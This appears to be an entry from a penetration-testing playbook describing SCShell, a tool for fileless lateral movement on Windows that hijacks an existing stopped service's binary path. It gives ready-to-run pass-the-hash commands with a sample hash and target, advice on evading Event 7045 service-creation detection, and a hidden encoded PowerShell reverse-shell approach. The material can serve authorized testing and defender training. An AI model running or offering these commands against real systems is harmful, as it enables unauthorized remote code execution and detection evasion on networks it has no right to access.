title: SCShell — Fileless Lateral Movement via Existing Service Hijack
body: SCShell is a quieter alternative to PsExec. PsExec is noisy: it CREATES a new service and drops a binary on ADMIN$. SCShell instead targets an EXISTING but stopped built-in service (e.g. defragsvc), changes that service's binary path (ImagePath) to your command, starts it, then restores the original path. No new service, and depending on the execution technique, no file dropped to disk — so it sidesteps the service-creation artifacts that PsExec leaves behind. Takes plaintext or -hashes, so it slots straight into a pass-the-hash workflow once you have a local admin hash.
cmd:
# ══════════════════════════════════════════════════
# PREREQS — same as PsExec
# ══════════════════════════════════════════════════
# - Local admin (or DA) on the target — needed to reconfigure a service.
# - SMB/RPC reachable (445 / 135 + dynamic).
# - A hash or password for that admin account.
# Get it: https://github.com/Mr-Un1k0d3r/SCShell

# ══════════════════════════════════════════════════
# BASIC — pass-the-hash against an existing service
# ══════════════════════════════════════════════════
# defragsvc is a safe, common choice: present on Windows, normally stopped.
python3 scshell.py administrator@192.168.x.73 \
  -hashes :2892d26cdf84d7a70e2eb3b9f05c425e \
  -service-name defragsvc

# With a plaintext password instead:
python3 scshell.py corp.com/jen@192.168.x.73 -service-name defragsvc

# ══════════════════════════════════════════════════
# WHY IT'S QUIETER THAN PSEXEC
# ══════════════════════════════════════════════════
# PsExec:   create service -> drop .exe on ADMIN$ -> start -> stop -> delete
#           (Event 7045 'service installed' = classic detection)
# SCShell:  pick EXISTING stopped service -> ChangeServiceConfig (new
#           ImagePath = your payload) -> StartService -> restore path
#           (no 7045 new-service event; reconfig is lower-signal)

# ══════════════════════════════════════════════════
# USING IT FOR A SHELL
# ══════════════════════════════════════════════════
# SCShell can execute an arbitrary command via the hijacked ImagePath.
# Point it at a PowerShell download-cradle / encoded reverse shell:
#   - host your revshell one-liner, then set the service binary to
#     'powershell -nop -w hidden -e <BASE64>'
#   - catch on your listener
# (exact invocation varies by SCShell version — check its --help; some
#  versions drop you into a semi-interactive prompt over the service.)

# ══════════════════════════════════════════════════
# CHOOSING A SERVICE
# ══════════════════════════════════════════════════
# Good targets: stopped, non-critical, auto-restorable. defragsvc is the
# textbook pick. Avoid services other things depend on (you'll either
# fail to start or break the host). Enumerate first if unsure:
#   sc.exe \\target query state= inactive    (from a Windows context)
#   nxc smb <ip> -u .. -H .. -x 'sc query state= all'  (rough)
warn: You're reconfiguring a real service's binary path — if SCShell doesn't cleanly restore it (crash, lost connection mid-run), you can leave that service broken on the target. Pick a non-critical, normally-stopped service (defragsvc) and confirm it came back. Like PsExec this needs local admin and SMB; it is NOT stealthier in the 'no auth logs' sense — it still authenticates — it's stealthier specifically about the service-creation artifact (Event 7045).

choices.label: Where did the hash come from? — pass-the-hash
Got a shell — re-enumerate as new context
